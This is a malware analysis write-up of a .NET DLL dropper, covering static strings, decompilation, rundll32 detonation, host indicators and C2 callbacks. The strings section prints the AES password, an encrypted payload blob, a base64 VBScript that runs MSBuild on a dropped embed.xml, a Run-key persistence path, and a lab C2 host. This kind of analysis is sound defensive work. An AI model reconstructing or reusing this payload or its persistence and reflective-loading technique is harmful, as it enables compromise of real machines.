## File Hash & VT Analysis

732f235784cd2a40c82847b4700fb73175221c6ae6c5f7200a3f43f209989387 *Malware.cryptlib64.dll.malz

361e6edb47e711a72c7f8ee3c0c1632b *Malware.cryptlib64.dll.malz

VT Analysis: 11/69 Infected

## Basic Static Analysis

### Strings & floss output

```
AES_Encrypt
bytesToBeEncrypted
passwordBytes
AES_Decrypt
bytesToBeDecrypted
66840DDA154E8A113C31DD0AD32F7F3A366A80E8136979D8F5A101D3D29D6F72
embed
Main
args
WrapNonExceptionThrows
EmbedDLL
Copyright 
  2021
$2eab5b3e-db27-4823-8690-150bb182b16b
1.0.0.0
.NETFramework,Version=v4.7.2
FrameworkDisplayName
.NET Framework 4.7.2
_CorDllMain
mscoree.dll
embed
\EmbedDLL.dll

FLOSS static Unicode strings
vyJ/
p0w3r0verwh3lm1ng!
pxQRI8YJc6jVr3x45Y+ti/tT8W+3HpQHbcw1yZJQ9goNhoTt2TTRIbFkDsFdmrLwIklux2Tcs42qWV15vEWaGE7NywrhmorgjRarizl08J8eAd7JbR3zzqM5KbX5Vz6lqi51p3G0RGviA59gz1s6GcJ5wwIPCSHk5sidK2XJUUUgTGzWFXuM3QpGIm8XxL93J5HVf52LOfTEb9lBR6md7bIoG2xbZIZ7kC2nbXlmcHGT49NhP6mwTxfLSTERKP2y5d5kOruBW/xunGBZY9kcvYtTLYmzPtius491SjU5nKHyxg8VwR8VkynD71yf/0Scwz9zKDc9gvwHYwvpt7nGQmWXdtqxqEC6kvLB1XmyXqh94TJOTRVdLEvkrM7GdGQjuuewaCZoUCHabZqXnW/efw/igNangpSQTnjB4WUqunJkJ0uvgozz/dbPQFYiKc+pwR6H/nS07tk13jZOBbuFkwfYAMHDh82OJ0CXlqW0HjGGzO0fQkUZDX6qQeMYnQqPEn0oJKSQ8IMtIl5wwc0SaMNuIBombhxEXqARDk7f5W0lrksrNEL0Yj6HaSq7yI1GzK6NiotjbV/uaUmuVlkWM473Jct1+UnreB+f3JlyQ1eRL79NOHORagTY/rBE/gXI+ZgSbSWz05jGDtUBjabGDj1zQuFKfyccg2G3u5yqWnUhAIRaXadE13w1UoM5MHutDY6uk2xFXD5k29uL8S2RmdvD+XL/oA0AnKI6iBXkkMNDdxbf82cciS7mfF0bzLw9S/wmwj5OFZo0c/4ZgPlM/8Okg9mlJIngWK25f6iTX9p+JxKw6IywRN5HrQE5DJX0MksGdppW2oXNvEC9wmnzAKr3hLjkAYKdQS4ZqLJlf8d9UVpkfrEzCCX5qwykOfA6vovXJnjYraOFV2SqSBHkrPYu5zFNucq2vRJtIgmPm7vaJvo5nrPxezPZVN1KXu8F/3a888BZ6ut4g+JbDrJZj35+9qLbsB2p19nij6GyfXvSz8BDakuk6mHOvlUNALG2t3OYtaj8h4zuQvHSUn+XrIF8PgAYECUritoRkrq1ArKlbNsrOoz+FdEUXfDVmQU4ACtxlnkXpDbMZmGFlEkAtI/sMa8g2yB9ffHjGa8YTcw+WVaszbTLQaEA0xtzHXDlhVXA3rwJ0pJQFTlyjx78GgmMK5EleZtoAWc5awt8c0I59OiK4lR+fp2PKu7BYU2CH/IOkzc9Zzzu1+Ts7M+PIc51aD+Z5Ci6H4ogXufEQjtw8DprZRMK5q2aJ4jsJLQbkskl/WeedJpDuRpMDNsRWHFJ3rH+x2ucoVUqxE3phEKG0I289jx5HPtqss2NICiiHmmUilIWs3R8K3QWfocBu9XjFgv34jJ6lAj5Fa3j/ga6pTrzM2rsytKdOip2U8xQ9jnwanQyk52Gi4d8hOx3Wat9Cqv7WGT067ISKKUfKzlWLTfko7R5+g/qFt58LY5Ip4L7Yp50qLRXuzJ18avwFhS+L4ObzFy+Go1Vj8gFUpIanRbz01DaioxtNDGvV/fjizMTC2PmevpdzuHyU9UiJfW988/FLlIydXZug9WHCiNa2Fqq3BOG0IcjC+l0px+1HNUSIYjpTHFTDWv7ykv7tGbiigJA1uK0qTpeZhujVxRi9lawW/EvLSjuJkmEiR1uTyP8bzAi41NFNZco35q211nUePQWqzTZhmciptqegsAGlKk7dB5rtZEHgwLq4JDHoiR7eow2i+RJwITi/UKvQCj8vI6Er7G5vh/lR+LEcUaggf4U782yadFz0743Lw6WGMgp5f1NU1WiBsWctvGWpTSRkW2TbirQJAVl86w9LL7SGxmSt4k1GCCglcXXCJxOMYN6i5bUxvOPnFkeTqmNkjAnhgDQLHanbK2pXmtUUdhpDZlNTCqlJzQ5bQuK+wsxlfW8rmxV83Qat7dQiw6WaqivSH2h4PRH9F0oBatG+IjNXY3Jf2qLmOXexgPrV6yPpHaIm5pTvaKIOucta91/Ny41hnuxEyN5Ni//GoNSkn4KGWHAH9tP0wY/gJjRFWHnyWSTGaeH2Nsa5wViO+De72ATimHWmPOFONqbBpBUGHsd3+wxZUD1B9co7AT+CI1nqcDmBGpM66x4sWr85c4Uly6LU+kSxRDhpW/DQZqCgKcmapmWSZYCfQBQkmTvXKobZI1B6uj/4yS4wShwADtBjQbYjy3DHTp6o1Gn475mwGlOo7xqxEiXeM2WgucSMdLsNk2EFVQzLXkUahNq/Sx/CE+WjvKdLeL8SxYYApyqM+t2uJznrlz6LL5D5nRsB4HO72knML47CsorzvJ8tiEEhGk77C6ZMZx4oRXly6SPOitRbkVrGUZHMGN7rrJicahyi3YZ7KmvVoglKigwyxuQm9HF/PP3fCDjaVuAj4eXUFD1dEblF9BPvXW3DymBN6jCVwWdgqu5b6KTpWLAjM6V0Ckkpt+b28XPJ0iAJ2jAJI/YQybjT1yh3ZdcJ+d/9n6pw0v8hbLn/JtF/5eaEt54WI169aNYdJMdcS9M3V5MAuX8i53z1k9hnXdIQIvbxj/izIPBmd2WPFkRa+yvL3SRMlwy0zINB5iiXgtbPoUfOpSoWSMJsiDn4WfuKDUGVpYhpnRgZKmjNy47jjdrTIpJ+1DTooYp8Zx0J9uGIPqcynFPaNBDEP227Hb9H6NyaxKJQq6Z2QeisJpBGdDxpwwGHUhkAp3/BRgkZE/NBETsS+s2S5ON1eI4ts8yZPSZE2DBE8Ajqc7zreIXtrgdgFK9F/nN/X6Xh0j8syiW144SW+UBWGE98ed9IVSa99VFyL1v0P6cIz9YZyKdYSeqlZcohTvb6bPosr3EopoT3nfpoK8iaC67YNgM1s+l8RD30d6qBPuQFAC/xGspjADHNCLudkxRGAjCA8FV8atVvMAqTVhBV6HLPAN1mdSfJ0feiQ4qZ11IWJCtjiprRSMT4ozMlluFGwXTUKUW5JHGZ8dBi+5mbDbFm7Mho4EY4ItB3kNdI/NPtodgiWZCmleUdg8TrXECuQ+pVY02PMwGwtKGjHEU3cEN7TLsBq53/rn7k631pMNxHbMixs0gspWdcrU3yoVW7d/L3BbA+Q9ue1tXnRY9k9zlsU12/1UtATaawoACA75gRjl33k4ngt47SYthzKgiW+yNfvdYW6MYF+ViuYgFg168AVAtn9U9NTLrumcXxlxvA6M2/jyeWvMeXPdtocHfnMubIJmAdcqRJNpYlh/QJPAW7hN6+BAGo0Lo/OnWCmWdK2gCePsfCWzL9BR+F/w6dhbqEYtXDb6LXs0jdJ9qrwBIxg/8zTLcP5P+MVVdmUv4xApqhnOTJzET0F8Ng9G4PNRVspCEPs3GkZh6dohnBPEIChNmrAEsY3YHQ7La4mtsmLWesHnrM2UeRkBluzsyvw0pgN08eWeGQvrqKUjMc/Qq+lJF4GgAoH+87ATcWjOOE1liHhtA/kK9B3CawQTsd9BcUqHyOmpFuTVWtdU8GjKBz1dxeMqUKJcbvgZhKx7Wm3n0WmMiqpZa6xYfe1eCxHnQOCjN3Z/eMGhodCn4dcrW0sE2/pvoZacnwG8XZTH1jhMzPK1a+rcDe372c2qxH46NNhmUqyrB97nghE4N3xDLptFxqhAhF98sdMIapbKe0dNHptVn8hNZIXzJjoOW+n4yFrqHLAhg74PcknB7DHh2LjcPwE0ovGYz/5dWHjTrcuCa9Efbk0Aj+j8gDYewoHdYdYF/HLOVZ9Xc4YMDKgWHNaHMB94DwT64GGxCMkvky3iEHSApo32efnxAKl/wdhuyD2O90ehMUVDNdgzPYnDRn/SEYyOfWDIIeo6pnvKHZaFpSvadKngTzS/rtZ2urmh5Wt6F3ew3XytwuiEYabggPE13CG2Hut4ruriId5TkfxTGEWy3gOV+/hLNRJpTKzs/MbkP+y1UnGecs0AWhL0PwAtwrnSBUukNmvVvZHECNeYCi9mVdOK+zHg5yXS1dAJF/zGBhp8CjltGrgCCkrEU9+JGC75XcrkxxoYTnok79NnLWqCtEeNqz+zOtVZ8hPYV7iJi9gb1+IXePzpanBVBh/UvtWu7U1WE8vSwmyooLJ6/yfnPA8WzU5vntmntOIHi0U8JXYB2MYVTI0R/fscAmyOoGuG+wgig3+7ZnPfs2ErbPrs3Ev54Naiao3RtknER4YYUGrREx9l1XKG7PMVUqdS9Ivsohb791pktQ7F3Sy8FJtUCXLqXWC9tvsezZrrVvR4wY9vDqK1ko7LvcKKqMS8QXl6l+TFSQ3SYmWgJfTSorfAsaz9njkvJnOWrkUK4rb4tOhDeeGh7Y7pufnjx+XnJk5+j0qI6XlK/TQ1RkIbU/UrEiMsJM8r18LqL356w9mxOqkYsEfal/X4SvCZ532nCeQxkqJD+9isMeZWlPRKyvGD97W3jgvt46kkNPQl898mB2wTtsWzBndV2R+kFDG22Z9aRrD2S7O2A69cBTRmwxEgBOsrnZgtjqgP9ZlZM4tPttaHe8l0y3uLMTf3HsfM7wvv679bo3YgFQcMgwHAtlXeu/1z3aSwccOYziVepJA+2OXNuRp56NcD6lpY+vQZvqSYh6kyjw5NYraRZIWt/6J5xmw9OyQ+Bb3JeqG93aLuz7vf5lwZGP7JagEG0zIlboA3qkElCmzR+lhO5a5aXv6ROj8YkHkXa3CUCH11/1whOWihfMgM3cl+RFTVbCUE69VPnB8sEjDXwGt1cViOoAL/y4x5wy3OLwP7/yACFjT12xrGrxDF4GsdbotWu27TgMPy+TiFEm2Z9IbUGm0nwLl8Ceqb+28T6O0GYveMOJrgj3bx2MxJGOksWL2xIYoiqs+xE0Z6FNTixDlubj0Tv2lwFHQ9Qr/VOqM0hgOr5WY8l4qNaX0Jrgdw1hxWDDXwnMhtjDTboZnpLX6669G2PxJfFs+JoaOxt8FwFd0PzKbawmSlFrQTaD7f3IT25PI9Zq6SEXklOa82SUKPbQnq6ZHBsBweUwLriQYdzRJ+94b/MAglzyuPvfToqd7v7jK6N7R8xReomMXaB397PsK88nbPF1wH1H19UyH2toUVDKcMd2Qo0J24S3ITx68IF2vUh2SAlM3cS8Vruupt9gLkheBY47wQ7kpzjwdtQc/WjdJpVdLyY1Xnoq4U1SSoNT5W2ZXuwIXmbUp/NEb8hZQTYg8WQ2i9pi6u5sp1/zjMMmuYEpU4Ig9rdIgipvxzwZVkrz7MGA9iYFE9M5cAsVbQmeJ1LFeMOeGqR7fx+Z8IB1qIrgA5548xmr4aznmXab0W2dmoy62zziUtFKjWrlGkAjFM30679HAjRUdxtqW/oAPBF5u7OWZMjXlS+1/rHj22EL7uK3o2fZ58P8aaaYL2UsPBg34veqN5zJX8sMIIVZxSi1Mal1y2PKGBr858FY2qm5CcyugDTgID1tiFmUCZxcuRherU0aRmROnaZDTh9RuEpxF+2neaRfTo153m6j10F8Rgru3sso/3oisfYzKT4BM1HyVmR86Istko2VYq8BFWlYWsafoFFaSkQp6kbacMeulVNBQdCgYfiAhgR+HwGfbgzDNiJqJnqpt2yfx/VgVKqRKQAgS8Kwx1VZ2HTNwKyt/70nmsm3UTm4Q/arC/cB7tUKWvxof+3TmU7Y9K9OWDzzuDN0Eo7N0BpUFBP2onaT56vYjvuVc3PY85zlsvXQHFA6CCKKsRrhYHCBTyQcIoCc7Dd38qTzwROnxQPEJEsUaB1PHPyoo1zq7QKTeaRpTCFqS0xHOipitiyCeu1c8PNiTbiGxat63veJ9reCSRVyLFDSb5+/KYF+NDUEmc/nTdjdW38Lnbj9xdnd9Sg5uxPdlUYGfmgJoKM4N5dAxseqW02Bb6ZOA8Bt87GTH9N61qFIjbN2JPvYpCgHr2/ypPVSjmKXpeJTISDJvHtxLue1CbU6NNp0rD44O91A0vFo/7C2rCMliS3V7NUr8iw8A0shj7udWfzmgzAN7sS7dEvDXFNbRsz15VFQ4bWrmEL0MfliYljmkn+S7sxENxJC0J9kCbo6IfxLHXJc5pJMIT3SdsKixZD2fVZHbIcCa+5bHGoSEMv869pdIRTv8gMeLJMNPV6w6pDlx+OTDClV8sKmxBr62T0vU/pgcMWxHpnURYlkN/J0CTcAG2eFGpMmiqKqaG+6+GTaSok4tcFKB2hooHDApBtpYHyocJIPQcQtOCvAu29ULTS+z1ZNFpUbnSy68FhNBe7TcE6X7Xijm8osdOJbFj24r4ejLBrvlO+LHQvNNKsD09xBCOOJ87kJI3PnO1K+nvUAbxx7y36+aFyv655Ve4oKPNGW1mURoGuRgtXq58rET3WRp7pRMzaHUaFlBs6WEDBH0e7/J4LuzJUtp5+BxOhQM5tpQL8W48QwJT9l253RoyPMbe3ROJ7egKr5mkpP/4s/twVug7ZuaEMUz2iLaG/yMSLnISR1xcRoMYmCb/yV5q9zRjZ2PCbxszpNZypvnzAh/Mgt2SbDWRTv41kE5rcyo6Exm3vZQ9rzyEGrzi+m5zK66OAEPp9u3JQVchKzZ6hEx9z3dRgcATE9araCi0aXPmcxx8wOdZ/Aqbz0JjgxHY2JEYwEpJJaAVwQYjUYlC65gNxcz6FpIMlhSugVDHa0FFF4iYf+ZyuPCd3e/xtZLQ/QJKF8b0/N+Thf/SXclG6nm69t/eb/RIi86VHILnKXKB83zfXYzi4rabxtr1PouvN2rJLqnN9wq+nkY9Bu7RXt7333SuJmPHPlxL3amZ9uDdOhRoP8GjJWAv98qNXvr/VzgpCMwnQ2S33qpK66mP5vBffzB/LbR+bSObo5tVhFh2x5VMGeoU3lTbKIbdivh5rOy9GHPkzDjBab9Eyr4UgQfNTtrsXvXetqTwekMU5GCBrltgv/2yWLpw/LSxHe5eC6LsuUodAC77/G9/Pg5Z9lG1E1qKEu2McKf7N4TNBb6KtgEDsGdlbHoQUPE3UZOCk0DRFILKHAV2q4u3pf/qnBYZk4bO+MpAEN9X25CPLCqo3/oTZNkBerkcRRJpdGxIPf1y2BB96vSTzXcp01oTZIU+XGoKySJub9e2ZuPMTHYkWs597DU+lrT4nP+Wvc2RpFFvj41yxv2wnbna40GKHas4uKRmUTuH5qIE3XHEtNLmOPPFYQyL5P/g0rOU051NP9nmuwNJI8r0+HwjXouegeh0BcMnRFse5NII4Iffs0xFDM3dj77Zs746ad9SWy+wcvfbT8V1AbVt3CFoxdzKJqkxH+U3u7LUZFbF0l4ZonN2xn2AECGcNbiI4433eUXnDhcXX+M3s7eUojsZ34OpeytSdMSE5aaovQLsQtJCJSVdE9MF6aorfxOFo9MeZe+ITV2bdm29ZC/cHq4oH051WIABUGNVhKdQnWeOzQGREG1f/ulQNf8u98n5RLZq37FdHb/k37iVm6pou7zWWZz5/puVTQkt5GqDFwSQq4R8DnVDK31EwlTeYOiXkP+sKuS0vPpIlNhlKkV9OH9HCD5Q4p2gk4XKp7omWm4/ItbO2ytnLMrBLOCoE0pff6q73ONDnQSnGyl5agJddmA7qrAgTwfN9d1bwaMAclhmbrPAvJD/qSsD5b/Ss/CSOzOCsVlw6R8hLz65oaFtOranYlIxunNPk6mTg5fGx+wIlAQVFmPF0buqT154N9otqC/aVTeqa3ygSfRhuPNM9Io5UWgJUfFy/AzYbgA6pVQjp1SHoxSVukm0XR8AvNaz5tGrs/NV4Mt8mcFJgq1w73zXXGISrFoGf6TSFtYcjDTLeHw5XGaZPaUrsK4Q8fJuk/eniubbldmBPODgOamjvBWVcOb+7sNw8HvV4ztjWtxfWXEs3hU5KVI6RDZTJCNFpAnY6rl9FAx6ZgkQnW/XEQmcqBxUWI3Ii68ShREFi2xdGT4oojR7sg9uN/QgqM/4u6oaKtfkUaBNOquOUyWBrM4/hbbuHljwBw7l3spIsSYAasnq6mVdS9fV8aKlMJj0tHfKwGQquK+4eUF7DOU/4sffLtKSD9L18qJM++NS1Cky7zH9tq66npIEOYR65HQvI7pzWTRkor+JgL8HpDPm+JBU/IHLJLBzhFBONUL8ug6dqq/fnluAS7xiUQFAhCJ3C+Z7m4qfDWQi7DGsM0Si9UylvbzVP/LPY3uqQb+g5rlUFDyRS2SgHfdCBmQIm3R3ptQBXMl13PswPkQqZDjz6VbcoucqKeEdVionJfAMUeavmiJUwgWun4GekXlEjs9nlWuBQU65oNtXGFTCAfYuTs6LzOsLPi1aNAZpESw1Eoqy7VKRMXLO1zOFt9CMsOk5xziD299SJataK+mwRt0vYdhVP2OtUgjVLtBa2SxxSPciqXvJEeJIfkdWLYzxl+/3jqysmWMzrP0vPG1MEUMcfUfPksNsnNclng4rmFQdTvwBQ3XpF4L2xs0TU/82VyfCY8pWGwclK02nE4T96v42w3iH+173c3FEW78jNbCadhAb4r48dIHc7pSkGga2qYlWtkvprgxLW0rHV3uVancDW5J6FzrVSgJfugMqQQmKpEi4Jj0YfflGQhdJLeA00AXBTfuMbcT4MEY9SF/t8AhyaWfRRVQCWAnBSGgrvYYdNQepf0W4cFiLfjLqxgjVGZHoajIZ2iNagf8Ki6dVRmLLjmlGJ3wbnsUX7Z1YO7M9KApXKGDNzJrM0aBu4z8EC7195EMiOn5jh2aarA+rQh6w5kLbTu/StpJuWi1gqTLmNNjoXBffzjPRkf/+ZvTn7+75/EDEgKic8GMF+RWgfmcAn8wKewZo7pmGO+y6nnkp3fFyR1YTfQViTeYtKtnXULs4iZHqm24yZn6SSfokHDOXw7kPUWVf6cQ6jdhittRqV3VYkhgul2X+MV+QirL+LhBOmq+d9sjjUKmgFHBw7sl6UmSzeWkoJcTXg1kmsp3WIv65MmoT7wvbZJh7xXkL+TbGyp9xtp/y7WMI1qRGTvupmxmzTEj0Q15lBA82ffSUrNm/w0JbsG9ljk9GoGTS3u40nFmJ3TYSARMmdNLQCICkjXT4QTgT9QhlyxUgRU+GJCcFLSR4xlJsi6j4hxQHGgsPZf4UH64rlRIve6Us1e3u2k71sNzOHAalVslyZnzg+KxjBdfUC1i07mDri88eF4z+PIgF7+vOBEY1uxKdOOlT3LimN6u8PigODnk6H9Uw0UkpL7LSqPzeg0V+AVymAVVngsjAPmlB827H1G0+TYXlyr7f9871D8MpayLgKMeFgCNb1oiRIM3rdn3TlxbStaStWq1aBPv79z+og0FmQiyDnEuieB6soGDw94XlAr0msRBIerBiL5HvU3PpBf784+rXNJyFNA78Nhql9Vp0lzVZk3Ntig1ky3X/zKBqQfuXUXqjjB0WjsT+dX2cskHzL40HmJku4+gOUGxWx3bI2biMLVfo/hPb21wpyXXzOIp702Q729VODqZtRNqaKuCy5dVuFTMD1Wk+xIzGecJQoSPhk3UbkETvu/iOkY04L1pKVH33ruAUxGXJcceyHX6rvTbmVmc0/Fc1H8p3t3ziUrFI7dvfaMnSTWAykC7Wdaa0jZ8C1ed117sdwfeJCTTnxnEJvSHvHlV85WwkvSkXUsgP+DVyGawwOaYp6BJXGqBmpTwUnU574cl5f48toZmR0uWRiEgeMfq01sfRzHzrUXeIZg3t6xGABW6fEXyoqiDlk0djfb+Xhv10AviKEKOs/lxymhQUgmLiTGYGCrOp5rSWmhCz6/dOzJ11v9DjPfvhVhvbrAwhO4CdFUuYn/KyaQFZQi8MhK77mWsvrSVjsnB2vx9X/Wmru6vcN68tiFjBA0NOYt6FOg/ItJFAF2JDbntZxuzvB0NkJE8rp1c0wRVkH216ruXrZcnoNDeZsfBpwBxGDb+zoE9he6zqGd4k6nHlqntMbnbo55VfteO21XzkiCLAzvSaYqHVfWkz0XYfJzAnD4SIsqJ4FzvWk3qotGkDMcplvzTJQiF5kshbeSCbYzRaaZfpZHT180lP7yKwXmHRl2yQJRT83rBDoZQkR+vDn3qeqP77qKa15AEi4qkfi/4VoPt4bDKhFGS8hHRJ3vUH1NT3sg5Q2VS4GbMJfF/yaIVj34Hyv2TopVOAOFMH1G1d9MT70Rs5MZ+rPr7VBsPXyh28qmzAFj+lhL6UyOxQ6vQPiT2eVHtATUARHZQhrvM3XTTH2nV+BbuRKY2MMaJM3kowe17nO1H5kl7lqt3vN353VUqJ1VfP0xf0egGfXwVcwCUCke/jygn0om+IfevAC4JR4JdXYaS1qmIVxDf0pElTTeRDVArqPjeGOr6ZLihslzdbCIuU6hUE/nYdpCM3CL73+IYuDxOPWaqWg9gWjiBkKX53VKYBJZVZl9LtKeEPpDiGXRVK+Sk1iqzken8i3hrMboHmzzfM6rcqq+yisxt7thZH+auY3O3xzkJDAZv9lCR20l3gz017Erv2aGkWm4UXwLH8R
public
\embed.xml
U2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCAoIldzY3JpcHQuU2hlbGwiKSAKRGltIHN0ckFyZ3MKc3RyQXJncyA9ICJDOlxXaW5kb3dzXE1pY3Jvc29mdC5ORVRcRnJhbWV3b3JrXHY0LjAuMzAzMTlcTVNCdWlsZC5leGUgQzpcVXNlcnNcUHVibGljXGVtYmVkLnhtbCIKb1NoZWxsLlJ1biBzdHJBcmdzLCAwLCBmYWxzZQ==
C:\Users\Public\Documents\embed.vbs
Software\Microsoft\Windows\CurrentVersion\Run
```

![8a8e477344403685d5e32fabae2b6de4.png](:/23bc986cbdb1476bb1f9b34b717c85e1)

I noticed something interesting here mscorlib, it is a series of Dot Net libraries that can be imported when we are building C# applications. And this imports a bunch of functionality for a C# application, and it's assigned dynamically at runtime. So it loads all of the functions of these libraries into C# binary when it is executing in the common language runtime.
We can also see there is a call out to the Dot Net Framework version.
Now that we are working with C# binary we can use program to recover the intermediate language of the assembly.

### DnSpy

![14e87cbd02dc9d1728bc99a72655b761.png](:/5165d1f7e37a44d7945c1c1c4c774303)

I'm going to start analyzing with program class.
* We have byte array in which we have sha256 bytes of string looks like we are going to use this bytes at some point since we have AES decrypt method it must be the password.
* We have big base64 string which is also the first argument of AES decryption method.
* It looks like we decoded it from base64 and AES decrypting the block string.
* We write all text to place in the OS, we get the environment variable of the public directory and we are writing this to a file called embed.xml
* We have another block of base64 text that we only decoding and writing all the text to C:/Users/Public/Documents/embed.vbs
* It is opening the HQC current user directory hive, going to the sub key "Software\\Microsoft\\Windows\\CurrentVersion\\Run" and setting key value "embed" and we are setting the value to "C:\\Users\\Public\\Documents\\embed.vbs". Looks like a persistence mechanism

## Basic Dynamic Analysis
Since it a DLL we cannot detonate this malware like we do with other malwares. We need a container to run this DLL like rundll32.

### Rundll32

To run this DLL we will have to provide the method we want to call which is embed in this case.
![bdff21d86f23348a1882b06d7a417520.png](:/da1039166cd94b888860e44ee6028a6f)

After Initial detonation I didn't notice any popup or error message. This malware is going to drop two files in OS. I analyzed the two files embed.xml and embed.vbs.

### Host Indicators
I confirmed that two files are dropped on the location mentioned in the code.

![d9c7e3aa3d1f00b61d8e3224afdce8ed.png](:/6aa286c0cbea4cc89665f524c92dbe2f)

![6f9b5a00d7d7f30771092aaa8c4398b3.png](:/29ff91bd7e45469587af9382056e6982)

![c94a7cbdada4d57fa25e935279c7c296.png](:/3c852d4cc78f4ca087a78691c9979b50)

We also saw a registry edit in the code, we can confirm with regedit whether the key is added or not.

![6eb024b54fa4a26f9e91baf03c4d2218.png](:/4663c221a00f4b3684d680fa19a90be2)

Yes indeed the registry key is created.

## Analyzing embed.vbs and embed.xml

### embed.xml code analysis
* Looks like here also we have big block of base64 encoded string which also compressed.
* We also have a call to system.reflection.assembly.load that means that whatever the base64 block is doing it is then loaded reflectively as a reflective assembly a common TTP to avoid EDR and antivirus.

![648239aec31f745ab818e175bd07985c.png](:/968da45b731c483686305c1b29238f21)

I decoded and decompressed code with PowerShell, I saved the output to file and found out it is binary. This binary is the actual payload that the malware drops.


### embed.vbs
* Here we have the VB script to launch embed.xml

### Network Signatures
The binary embed.vbs is trying to call http://srv.masterchiefsgruntemporium.local/en-us/index.html
![3f782b76e073dfe02916434cd3ecfc36.png](:/c692b5e7d374476daca37e71f2146773)

And the victim will get a callback at local port

![2ebde0bc03ce1d44bee52e3013b3cabe.png](:/4e6a54a22b5a42d09bdef2e463c0da0d)

It is sending a DNS A request  

![534f02f86865698bda8e1db290cb2f53.png](:/a338aed391ca422286f22bd8a0bcf242)

### Summary
* We have registry run key which runs the VB script embed.vbs when someone logs in to the victim machine.
* The VB script is using MS build executable and passing it the embed.xml build file. This build file looks like a C2 reverse shell payload. 
* This payload calls back to the host srv.masterchiefsgruntemporium.local. Looks like the listener is setup on the host.


